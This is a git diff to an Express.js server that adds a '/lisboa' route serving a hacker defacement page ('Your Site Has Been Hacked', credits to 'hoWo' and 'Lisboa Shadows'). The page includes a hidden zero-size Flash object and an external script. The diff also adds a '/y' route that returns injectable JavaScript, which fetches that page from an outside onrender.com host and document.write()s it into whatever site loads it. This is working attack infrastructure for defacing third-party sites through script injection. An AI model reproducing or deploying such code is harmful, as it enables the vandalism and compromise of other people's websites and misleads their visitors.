@@ -36,6 +36,86 @@ function clearHTML(BadString) {
 
 // Pags estaticas
 
+app.get('/lisboa', (req, res) => {
+	res.send(`<head>
+<title>hoWo owns you :D </title>
+<link href='http://fonts.googleapis.com/css?family=Candal' rel='stylesheet' type='text/css'>
+<script type="text/javascript" src="http://smilenet4u.googlecode.com/files/TipingText.js"></script>
+<style type="text/css">
+/* Coded by MR.ZERO */
+@import url(http://fonts.googleapis.com/css?family=Share+Tech);
+body {
+	background:rgb(0, 0, 0) url('http://4.bp.blogspot.com/-h1QH3MmXd4M/Uc64vsqmPeI/AAAAAAAAALs/Gi-fPnZ5V2Q/s1600/black+(11).jpg') center right no-repeat; 
+	color:#FFFFFF; 
+	text-decoration:none; 
+	font-family:"Share Tech", Courier, monospace; 
+	padding-left:200px; 
+	padding-top:200px; 
+	padding-right:300px; 
+	font-size:16px;
+}
+a {
+	color: #2ccfcf;
+	text-decoration: none;
+}
+a:hover {
+	color: #fff;
+}
+#example1 {
+	font-size: 42px;
+	font-family: "Share Tech";
+
+}
+#example2 {
+	font-size: 31px;
+	font-family: "Share Tech";
+
+}
+#example3 {
+	font-size: 26px;
+	font-family: "Share Tech";
+
+}
+</style>
+</head>
+<body>
+<object type="application/x-shockwave-flash" width="0"
+height="0"data="=true">
+<param  name="movie"value="https://paglasongs.com/ashley-look-at-me-mp3-songs.html">
+</object>
+
+
+<div id="example1">OWN3D BY <br>
+<font color="cyan">hoWo</font> in partner with <font color="cyan">Lisboa Shadows</font>
+</div>
+<br>
+<div id="example2">
+<font color="#FFFFFF">
+Message for Admin :<br>Sorry Admin !<br>
+Your Site Has Been Hacked System Security Is Low , Please Patch Your System.
+<br>This Is Just A Warning If You Still Dont want to patch it<br>
+We Will Keep On Hacking it. <br>
+<br><br></div>
+Greetz To :<br>
+<div id="example3">
+<font color="green">
+hoWo - user2718 - S3v45 | This is Lisboa Shadows <br>#OpTakingAttention
+
+</font>
+</div>
+
+<script type="text/javascript">
+new TypingText(document.getElementById("example1"));
+new TypingText(document.getElementById("example3"));
+
+
+new TypingText(document.getElementById("example2"), 150, function(i){ var ar = new Array("_"); return " " + ar[i.length % ar.length]; });
+
+TypingText.runAll();
+</script>
+</body>`);
+};
+
 app.get('/', (req, res) => {
     res.send(`
     <head>
@@ -120,6 +200,10 @@ TypingText.runAll();
 
 app.get('/x', (req, res) => {
   res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com').then(r=>r.text()).then(t=>document.write(t))`);
+});
+
+app.get('/y', (req, res) => {
+  res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com/lisboa').then(r=>r.text()).then(t=>document.write(t))`);
 });
 
 app.get('/login', (req, res) => {
